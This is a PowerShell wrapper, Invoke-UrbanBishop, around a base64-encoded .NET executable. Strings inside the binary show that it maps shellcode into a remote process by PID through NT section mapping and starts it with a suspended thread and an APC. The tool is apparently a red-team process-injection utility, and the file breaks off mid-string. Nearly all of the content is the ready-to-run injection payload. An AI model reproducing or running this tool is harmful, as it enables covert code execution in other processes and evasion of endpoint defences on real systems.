function Invoke-UrbanBishop
{

    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $true)]
        [ValidateNotNullorEmpty()]
        [String]
        $Command

    )
    $base64binary="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LgA7AIICLgBDAHECLgBLAIgCLgBTAIICLgBbAIICLgBjAKACLgBrAMoCgwFzANcCZQBCAR8AKQA5AHIAfQCiAKoAzwDnAAQBSQYPAQABAwA9CQEAAAEFAEsJAQAAAQcAmgYBAAABCQC7BgEAAAELAM4GAQAAAQ0AngEBAAABDwBkAQEAAAERAHMKAQAAARMAWgUBAAABFQBvBQEAAAEXAEsCAQAAARkAZQkBAAABGwB1AQEAAAEdAKsBAQAEgAAAAQAAAAAAAAAAAAAAAABUBwAAAgAAAAAAAAAAAAAAOQElAQAAAAACAAAAAAAAAAAAAAA5AVsGAAAAAAQAAgAFAAIABgACAAcAAgAIAAIACQACAAoAAgALAAIADAADAGEAKQEAAAA8PjlfXzFfMAA8TWFpbj5iX18xXzAAPD45X18xXzEAPE1haW4+Yl9fMV8xAFByZWRpY2F0ZWAxAEFwY0FyZ3VtZW50MQBVSW50MzIAPD45X18xXzIAPE1haW4+Yl9fMV8yAEFwY0FyZ3VtZW50MgBBcGNBcmd1bWVudDMAVUludDY0AFRvSW50NjQAaXNXb3c2NAA8PjkAPE1vZHVsZT4AU0NfREFUQQBTRUNUX0RBVEEAQ0xJRU5UX0lEAFVOSUNPREVfU1RSSU5HAEFOU0lfU1RSSU5HAFBST0NfVkFMSURBVElPTgBUSFJFQURfQkFTSUNfSU5GT1JNQVRJT04AU3lzdGVtLklPAE9CSkVDVF9BVFRSSUJVVEVTAGJTY0RhdGEAbXNjb3JsaWIAPD5jAFZhbGlkYXRlUHJvYwBoUHJvYwBQcm9jSWQAQ2xpZW50SWQAR2V0UHJvY2Vzc0J5SWQATnRRdWV1ZUFwY1RocmVhZABOdEFsZXJ0UmVzdW1lVGhyZWFkAFVuaXF1ZVRocmVhZABoVGhyZWFkAE50T3BlblRocmVhZABOdFF1ZXJ5SW5mb3JtYXRpb25UaHJlYWQAQ3JlYXRlU3VzcGVuZGVkAGlzdmFsaWQAU2VjdXJpdHlRdWFsaXR5T2ZTZXJ2aWNlAEJlcmxpbkRlZmVuY2UAQ2FzdGxlS2luZ3NpZGUAUmVhZFNoZWxsY29kZQBJRGlzcG9zYWJsZQBUaHJlYWRIYW5kbGUAUnVudGltZVR5cGVIYW5kbGUATGRyR2V0RGxsSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAFNlY3Rpb25IYW5kbGUAR2V0UHJvY2Vzc0hhbmRsZQBwcm9jZXNzSGFuZGxlAGhGaWxlAFBhdGhJc0ZpbGUAQ29uc29sZQBoTW9kdWxlAFByb2Nlc3NNb2R1bGUATW9kTmFtZQBnZXRfRmlsZU5hbWUARGxsTmFtZQBnZXRfUHJvY2Vzc05hbWUAT2JqZWN0TmFtZQBXcml0ZUxpbmUAQXBjUm91dGluZQBWYWx1ZVR5cGUAQWxsb2NhdGlvblR5cGUAUHRyVG9TdHJ1Y3R1cmUAcE50bGxCYXNlAFJlYWRPbmx5Q29sbGVjdGlvbkJhc2UAcEJhc2UARGlzcG9zZQBQYXJzZQBHZXRUaHJlYWRTdGF0ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFNpemVPZlN0YWNrUmVzZXJ2ZQBVcmJhbkJpc2hvcC5leGUAU2NTaXplAGlTaXplAENvbW1pdFNpemUAVmlld1NpemUATWF4U2l6ZQBTaXplT2YAU3lzdGVtLlRocmVhZGluZwBTb3VyY2VTdHJpbmcAUnRsSW5pdFVuaWNvZGVTdHJpbmcAUnRsVW5pY29kZVN0cmluZ1RvQW5zaVN0cmluZwBBbGxvY2F0ZURlc3RpbmF0aW9uU3RyaW5nAFRvU3RyaW5nAE1hdGNoAERsbFBhdGgATWF4aW11bUxlbmd0aABUaHJlYWRJbmZvcm1hdGlvbkxlbmd0aABwcm9jZXNzSW5mb3JtYXRpb25MZW5ndGgAUmV0dXJuTGVuZ3RoAHJldHVybkxlbmd0aABFbmRzV2l0aABBZmZpbml0eU1hc2sAQWxsb2NIR2xvYmFsAE1hcnNoYWwAT3JkaW5hbABudGRsbC5kbGwAUHJvZ3JhbQBTeXN0ZW0AQ2xlYW4AQm9vbGVhbgBNYWluAFRocmVhZEluZm9ybWF0aW9uAHByb2Nlc3NJbmZvcm1hdGlvbgBOdENyZWF0ZVNlY3Rpb24ATWFwUmVtb3RlU2VjdGlvbgBOdE1hcFZpZXdPZlNlY3Rpb24ATnRVbm1hcFZpZXdPZlNlY3Rpb24AaFNlY3Rpb24ATWFwTG9jYWxTZWN0aW9uAFN5c3RlbS5SZWZsZWN0aW9uAFByb2Nlc3NNb2R1bGVDb2xsZWN0aW9uAHNlY3Rpb24ASW5oZXJpdERpc3Bvc2l0aW9uAFplcm8AU2xlZXAAR2V0SGVscABVcmJhbkJpc2hvcABHcm91cABscEJ5dGVzQnVmZmVyAFByaW50QmFubmVyAGxwUGFyYW1ldGVyAElFbnVtZXJhdG9yAEdldEVudW1lcmF0b3IALmN0b3IALmNjdG9yAFNlY3VyaXR5RGVzY3JpcHRvcgBJbnRQdHIAYWxsb2NhdGlvbkF0dHJpYnMARGxsQ2hhcmFjdGVyaXN0aWNzAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBnZXRfTW9kdWxlcwBGaWxlQXR0cmlidXRlcwBPYmplY3RBdHRyaWJ1dGVzAEdldEF0dHJpYnV0ZXMAUmVhZEFsbEJ5dGVzAGFyZ3MAU3lzdGVtLlRleHQuUmVndWxhckV4cHJlc3Npb25zAFN5c3RlbS5Db2xsZWN0aW9ucwBwQXR0cnMAVGhyZWFkSW5mb3JtYXRpb25DbGFzcwBwcm9jZXNzSW5mb3JtYXRpb25DbGFzcwBEZXNpcmVkQWNjZXNzAGRlc2lyZWRBY2Nlc3MAZ2V0X1N1Y2Nlc3MAVW5pcXVlUHJvY2VzcwBOdE9wZW5Qcm9jZXNzAE50UXVlcnlJbmZvcm1hdGlvblByb2Nlc3MATGRyR2V0UHJvY2VkdXJlQWRkcmVzcwBnZXRfQmFzZUFkZHJlc3MAVGViQmFzZUFkZHJlc3MARnVuY3Rpb25BZGRyZXNzAGxwU3RhcnRBZGRyZXNzAFN0YWNrWmVyb0JpdHMARXhpdFN0YXR1cwBDb25jYXQARm9ybWF0AE9iamVjdABXaW4zMlByb3RlY3QAU2VjdGlvbk9mZnNldABHZXRMb2NhbEV4cG9ydE9mZnNldABvcF9FeHBsaWNpdABTaXplT2ZTdGFja0NvbW1pdABnZXRfQ3VycmVudABQcmV2aW91c1N1c3BlbmRDb3VudABwYWdlUHJvdABFeHBvcnQATW92ZU5leHQAUHYATnRDcmVhdGVUaHJlYWRFeABGaW5kSW5kZXgAUmVnZXgAQXJyYXkAQ29weQBSb290RGlyZWN0b3J5AG9wX0VxdWFsaXR5AG9wX0luZXF1YWxpdHkAQmFzZVByaW9yaXR5AAAxWwAhAF0AIABNAGkAcwBzAGkAbgBnACAAYQByAGcAdQBtAGUAbgB0AHMALgAuAAoAAHsgACAAIAAgAC0AcAAgACgALQAtAFAAYQB0AGgAKQAgACAAIAAgACAAIAAgACAARgB1AGwAbAAgAHAAYQB0AGgAIAB0AG8AIAB0AGgAZQAgAHMAaABlAGwAbABjAG8AZABlACAAYgBpAG4AYQByAHkAIABmAGkAbABlAAFJIAAgACAAIAAtAGkAIAAoAC0ALQBJAG4AagBlAGMAdAApACAAIAAgACAAIAAgAFAASQBEACAAdABvACAAaQBuAGoAZQBjAHQAAYCNIAAgACAAIAAtAGMAIAAoAC0ALQBDAGwAZQBhAG4AKQAgACAAIAAgACAAIAAgAE8AcAB0AGkAbwBuAGEAbAAsACAAdwBhAGkAdAAgAGYAbwByACAAcABhAHkAbABvAGEAZAAgAHQAbwAgAGUAeABpAHQAIABhAG4AZAAgAGMAbABlAGEAbgAgAHUAcAABUyAAIAAgAF8ATwAgACAAIAAgACAAIAAgAF8AXwBfAF8AXwAgACAAIAAgACAAXwAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAAUSAAIAAvACAALwAvAFwAIAAgACAAIAB8ACAAIAB8ACAAIAB8AF8AXwBfAHwAIAB8AF8AIABfAF8AXwAgAF8AXwBfACAAIAAgACAAIAAgACAAAFMgAHsAIAAgACAAIAAgAH0AIAAgACAAfAAgACAAfAAgACAAfAAgACAAXwB8ACAALgAgAHwAIAAuACcAfAAgACAAIAB8ACAAIAAgACAAIAAgACAAAVEgACAAXABfAF8AXwAvACAAIAAgACAAfABfAF8AXwBfAF8AfABfAHwAIAB8AF8AXwBfAHwAXwBfACwAfABfAHwAXwB8ACAAIAAgACAAIAAgAABTIAAgACgAXwBfAF8AKQAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAABTIAAgACAAfABfAHwAIAAgACAAIAAgACAAIAAgACAAIABfAF8AXwBfAF8AIABfACAAIAAgACAAIABfACAAIAAgACAAIAAgACAAIAAgACAAIAAgAABRIAAgAC8AIAAgACAAXAAgACAAIAAgACAAIAAgACAAfAAgAF8AXwAgACAAfABfAHwAXwBfAF8AfAAgAHwAXwAgAF8AXwBfACAAXwBfAF8AIAAAUyAAKABfAF8AXwBfAF8AKQAgACAAIAAgACAAIAAgAHwAIABfAF8AIAAtAHwAIAB8AF8AIAAtAHwAIAAgACAAfAAgAC4AIAB8ACAALgAgAHwAIAABUygAXwBfAF8AXwBfAF8AXwApACAAIAAgACAAIAAgAHwAXwBfAF8AXwBfAHwAXwB8AF8AXwBfAHwAXwB8AF8AfABfAF8AXwB8ACAAIABfAHwAIAAAUS8AXwBfAF8AXwBfAF8AXwBcACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB8AF8AfAAgACAAAFEgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfgBiADMAMwBmAH4AIAAgACAAIAAgACAAIAAgACAAIAAKAAB5WwAhAF0AIABQAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIABhACAAZgBpAGwAZQAgAHAAYQB0AGgAIABuAG8AdAAgAGEAIABmAG8AbABkAGUAcgAgAHAAYQB0AGgAIAAoAC0AcAB8AC0ALQBQAGEAdABoACkAAXNbACEAXQAgAEkAbgB2AGEAbABpAGQAIABzAGgAZQBsAGwAYwBvAGQAZQAgAGIAaQBuACAAZgBpAGwAZQAgAHAAYQB0AGgAIABzAHAAZQBjAGkAZgBpAGUAZAAgACgALQBwAHwALQAtAFAAYQB0AGgAKQABE24AdABkAGwAbAAuAGQAbABsAAApIAAgACAAIAB8AC0APgAgAGgAUwBlAGMAdABpAG8AbgA6ACAAMAB4AAELewAwADoAWAB9AAAdIAAgACAAIAB8AC0APgAgAFMAaQB6AGUAOgAgAAE9WwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAcwBlAGMAdABpAG8AbgAuAC4AACMgACAAIAAgAHwALQA+ACAAcABCAGEAcwBlADoAIAAwAHgAAUdbACEAXQAgAEYAYQBpAGwAZQBkACAAdABvACAAbQBhAHAAIABzAGUAYwB0AGkAbwBuACAAbABvAGMAYQBsAGwAeQAuAC4AAC8gACAAIAAgAHwALQA+ACAAcABSAGUAbQBvAHQAZQBCAGEAcwBlADoAIAAwAHgAAVtbACEAXQAgAEYAYQBpAGwAZQBkACAAdABvACAAbQBhAHAAIABzAGUAYwB0AGkAbwBuACAAaQBuACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4ALgAAJVsAIQBdACAARgBhAGkAbABlAGQAIAB0AG8AIABnAGUAdAAgAAATIABoAGEAbgBkAGwAZQAuAC4AADUgACAAIAAgAHwALQA+ACAATABkAHIARwBlAHQARABsAGwASABhAG4AZABsAGUAIABPAEsAARUgAGEAZABkAHIAZQBzAHMALgAuAAARIAAgACAAIAB8AC0APgAgAAEJOgAgADAAeAAAJSAAIAAgACAAfAAtAD4AIABPAGYAZgBzAGUAdAA6ACAAMAB4AAFRWwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAHEAdQBlAHIAeQAgAHQAaAByAGUAYQBkACAAaQBuAGYAbwByAG0AYQB0AGkAbwBuAC4ALgAASVsAIQBdACAAVQBuAGEAYgBsAGUAIAB0AG8AIAByAGUAYQBkACAAcwBoAGUAbABsAGMAbwBkAGUAIABiAHkAdABlAHMALgAuAAA7CgBbAD4AXQAgAEMAcgBlAGEAdABpAG4AZwAgAGwAbwBjAGEAbAAgAHMAZQBjAHQAaQBvAG4ALgAuAABHWwA+AF0AIABNAGEAcAAgAFIAWAAgAHMAZQBjAHQAaQBvAG4AIAB0AG8AIAByAGUAbQBvAHQAZQAgAHAAcgBvAGMALgAuAABNWwA+AF0AIABXAHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAGwAbwBjAGEAbAAgAHMAZQBjAHQAaQBvAG4ALgAuAAAxWwA+AF0AIABTAGUAZQBrACAAZQB4AHAAbwByAHQAIABvAGYAZgBzAGUAdAAuAC4AADkgACAAIAAgAHwALQA+ACAAcABSAGUAbQBvAHQAZQBOAHQARABsAGwAQgBhAHMAZQA6ACAAMAB4AAEjUgB0AGwARQB4AGkAdABVAHMAZQByAFQAaAByAGUAYQBkAABxWwA+AF0AIABOAHQAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQARQB4ACAALQA+ACAAUgB0AGwARQB4AGkAdABVAHMAZQByAFQAaAByAGUAYQBkACAAPAAtACAAUwB1AHMAcABlAG4AZABlAGQALgAuAAFJWwAhAF0AIABGAGEAaQBsAGUAZAAgAHQAbwAgAGMAcgBlAGEAdABlACAAcgBlAG0AbwB0AGUAIAB0AGgAcgBlAGEAZAAuAC4AAB8gACAAIAAgAHwALQA+ACAAUwB1AGMAYwBlAHMAcwABS1sAPgBdACAAUwBlAHQAIABBAFAAQwAgAHQAcgBpAGcAZwBlAHIAIAAmACAAcgBlAHMAdQBtAGUAIAB0AGgAcgBlAGEAZAAuAC4AADEgACAAIAAgAHwALQA+ACAATgB0AFEAdQBlAHUAZQBBAHAAYwBUAGgAcgBlAGEAZAABM1sAIQBdACAAVQBuAGEAYgBsAGUAIAByAGUAZwBpAHMAdABlAHIAIABBAFAAQwAuAC4AADcgACAAIAAgAHwALQA+ACAATgB0AEEAbABlAHIAdABSAGUAcwB1AG0AZQBUAGgAcgBlAGEAZAABO1sAIQBdACAARgBhAGkAbABlAGQAIAB0AG8AIAByAGUAcwB1AG0AZQAgAHQAaAByAGUAYQBkAC4ALgAAR1sAPgBdACAAVwBhAGkAdABpAG4AZwAgAGYAbwByACAAcABhAHkAbABvAGEAZAAgAHQAbwAgAGYAaQBuAGkAcwBoAC4ALgAAPSAAIAAgACAAfAAtAD4AIABUAGgAcgBlAGEAZAAgAGUAeABpAHQAIABzAHQAYQB0AHUAcwAgAC0APgAgAAE5IAAgACAAIAB8AC0APgAgAE4AdABVAG4AbQBhAHAAVgBpAGUAdwBPAGYAUwBlAGMAdABpAG8AbgABSVsAIQBdACAARgBhAGkAbABlAGQAIAB0AG8AIAB1AG4AbQBhAHAAIAByAGUAbQBvAHQAZQAgAHMAZQBjAHQAaQBvAG4ALgAuAABTWw